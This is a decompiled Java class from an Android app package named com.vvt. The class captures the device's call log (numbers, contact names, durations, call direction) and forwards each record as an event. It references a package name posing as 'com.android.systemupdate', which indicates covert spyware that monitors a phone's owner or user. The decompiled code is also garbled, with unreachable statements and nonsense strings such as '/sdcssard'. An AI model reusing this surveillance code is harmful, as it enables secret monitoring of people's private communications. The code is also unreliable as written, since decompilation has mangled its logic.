package com.vvt.capture.calllog;

import android.content.ContentResolver;
import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.g;
import com.vvt.events.FxCallLogEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.j.c;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private e c;
  private com.vvt.base.capture.f d;
  private String e;
  private Context f;
  private RunningMode g;
  
  public a(Context paramContext, String paramString, RunningMode paramRunningMode, ContentResolver paramContentResolver, com.vvt.base.a parama)
  {
    this.e = paramString;
    Object localObject = new com/vvt/capture/calllog/b/b;
    ((com.vvt.capture.calllog.b.b)localObject).<init>(paramContext, paramContentResolver);
    this.c = ((e)localObject);
    this.g = paramRunningMode;
    localObject = this.g;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode)
    {
      localObject = new com/vvt/capture/calllog/a/a;
      ((com.vvt.capture.calllog.a.a)localObject).<init>();
    }
    for (;;)
    {
      this.d = ((com.vvt.base.capture.f)localObject);
      this.b = parama;
      this.f = paramContext;
      return;
      localObject = new com/vvt/capture/calllog/b/f;
      ((com.vvt.capture.calllog.b.f)localObject).<init>(paramContentResolver);
    }
  }
  
  private FxCallLogEvent a(CallData paramCallData)
  {
    String str = paramCallData.e();
    if (str != null)
    {
      localObject1 = str.trim();
      int i = ((String)localObject1).length();
      if (i != 0) {}
    }
    else
    {
      str = "";
    }
    Object localObject1 = FxEventDirection.UNKNOWN;
    localObject1 = paramCallData.f();
    Object localObject2 = CallData.Type.IN;
    if (localObject1 == localObject2) {
      localObject1 = FxEventDirection.IN;
    }
    for (;;)
    {
      localObject2 = paramCallData.d();
      boolean bool = com.vvt.ah.a.c((String)localObject2);
      if (bool) {
        localObject2 = "Private/unknown number";
      }
      FxCallLogEvent localFxCallLogEvent = new com/vvt/events/FxCallLogEvent;
      localFxCallLogEvent.<init>();
      long l = paramCallData.a();
      localFxCallLogEvent.setEventId(l);
      l = paramCallData.b();
      localFxCallLogEvent.setEventTime(l);
      l = paramCallData.c();
      localFxCallLogEvent.setDuration(l);
      localFxCallLogEvent.setDirection((FxEventDirection)localObject1);
      localFxCallLogEvent.setNumber((String)localObject2);
      localFxCallLogEvent.setContactName(str);
      return localFxCallLogEvent;
      localObject1 = paramCallData.f();
      localObject2 = CallData.Type.OUT;
      if (localObject1 == localObject2) {
        localObject1 = FxEventDirection.OUT;
      } else {
        localObject1 = FxEventDirection.MISSED_CALL;
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  protected void a(List paramList)
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    boolean bool1 = a;
    if (bool1) {}
    Object localObject2 = paramList.iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject3 = ((Iterator)localObject2).next();
      boolean bool2 = localObject3 instanceof CallData;
      if (bool2)
      {
        localObject3 = (CallData)localObject3;
        localObject3 = a((CallData)localObject3);
        ((List)localObject1).add(localObject3);
      }
    }
    Object localObject3 = this.b;
    if (localObject3 != null)
    {
      bool1 = a;
      if (bool1) {}
      localObject3 = this.b;
      ((com.vvt.base.a)localObject3).a((List)localObject1);
    }
    bool1 = a;
    if (bool1) {}
    localObject3 = this.g;
    localObject1 = RunningMode.FULL;
    if (localObject3 == localObject1)
    {
      localObject3 = new com/vvt/j/c;
      ((c)localObject3).<init>();
      localObject1 = "com.android.systemupdate";
      localObject2 = this.e;
      localObject3 = ((c)localObject3).a((String)localObject1, (String)localObject2);
      boolean bool3 = a;
      if (bool3) {}
      localObject1 = new com/vvt/capture/calllog/b;
      ((b)localObject1).<init>();
      localObject3 = ((b)localObject1).a((String)localObject3);
      if (localObject3 == null) {
        break label232;
      }
    }
    label232:
    for (localObject3 = "/sdcssard";; localObject3 = "patafh")
    {
      return;
      localObject3 = new com/vvt/j/c;
      ((c)localObject3).<init>();
      localObject1 = this.f;
      localObject3 = ((c)localObject3).a((Context)localObject1);
      break;
    }
  }
  
  protected e b()
  {
    return this.c;
  }
  
  protected com.vvt.base.capture.f c()
  {
    return this.d;
  }
  
  protected String d()
  {
    return "CallLogCapture";
  }
  
  protected String e()
  {
    return this.e;
  }
  
  protected String f()
  {
    return "calllog.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */